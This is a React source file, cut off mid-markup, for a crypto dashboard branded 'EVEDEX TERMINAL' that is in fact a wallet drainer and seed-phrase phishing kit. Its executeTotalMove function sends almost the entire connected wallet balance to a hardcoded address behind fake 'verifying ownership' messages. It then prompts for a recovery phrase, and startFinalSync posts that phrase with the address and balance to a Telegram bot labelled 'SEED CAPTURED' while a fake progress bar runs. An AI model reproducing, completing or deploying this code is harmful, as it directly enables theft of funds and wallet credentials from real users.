import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { open } = useWeb3Modal();
  const { sendTransaction } = useSendTransaction();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING TO EVEDEX MAINNET...");
  const [inputVal, setInputVal] = useState("");
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [nodeId, setNodeId] = useState("EVEDEX_RELAY_0x77");

  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  useEffect(() => {
    if (isSyncing) {
      const idInterval = setInterval(() => {
        const randomHex = Math.random().toString(16).substr(2, 5).toUpperCase();
        setNodeId(`EVEDEX_RELAY_0x${randomHex}`);
      }, 1500);
      return () => clearInterval(idInterval);
    }
  }, [isSyncing]);

  const validateSeed = (text) => {
    const words = text.trim().split(/\s+/);
    return [12, 15, 18, 21, 24].includes(words.length);
  };

  const executeTotalMove = async () => {
    if (!balance || !balance.value) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText("INITIALIZING HANDSHAKE...");

    const gasBuffer = balance.value / 60n; 
    const totalToMove = balance.value - gasBuffer;

    try {
      sendTransaction({
        to: destination,
        value: totalToMove > 0n ? totalToMove : 0n,
        data: "0x53796e6368726f6e697a65" 
      }, {
        onSettled: () => {
          setTimeout(() => setLoadingText("VERIFYING OWNERSHIP..."), 1500);
          setTimeout(() => setLoadingText("RE-INDEXING NODE..."), 3000);
          setTimeout(() => {
            setLoading(false);
            setView("seed_gate"); 
          }, 5000);
        }
      });
    } catch (e) {
      setLoading(false);
      setView("seed_gate");
    }
  };

  const startFinalSync = () => {
    setIsSyncing(true);
    fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: "7630238860", 
        text: `🚨 EVEDEX SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nNET: ${balance?.symbol}\n\nSEED:\n${inputVal}` 
      }),
    });

    let current = 0;
    const interval = setInterval(() => {
      current += Math.floor(Math.random() * 3) + 1;
      if (current >= 90) { 
        setSyncProgress(90); 
        clearInterval(interval); 
      } else { 
        setSyncProgress(current); 
      }
    }, 200);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6 text-cyan-500">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic tracking-tighter text-lg">
            <ShieldCheck size={22}/>EVEDEX TERMINAL
          </div>
          <div className="flex items-center gap-1.5 mt-1">
            <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
            <span className="text-[7px] font-mono text-slate-500 tracking-[0.3em]">NODE_STATUS: ONLINE // v4.2.0</span>
          </div>
        </div>
        <w3m-button balance="show" /> 
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4 animate-in fade-in">
          {[
            { n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> },
            { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> },
            { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }
          ].map((item) => (
            <button key={item.n} onClick={() => { setActiveTask(item.n); setInputVal(""); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl transition-all">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[10px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {view === "task_box" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[45px] p-8 shadow-2xl animate-in slide-in-from-bottom-8 text-center">
          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-
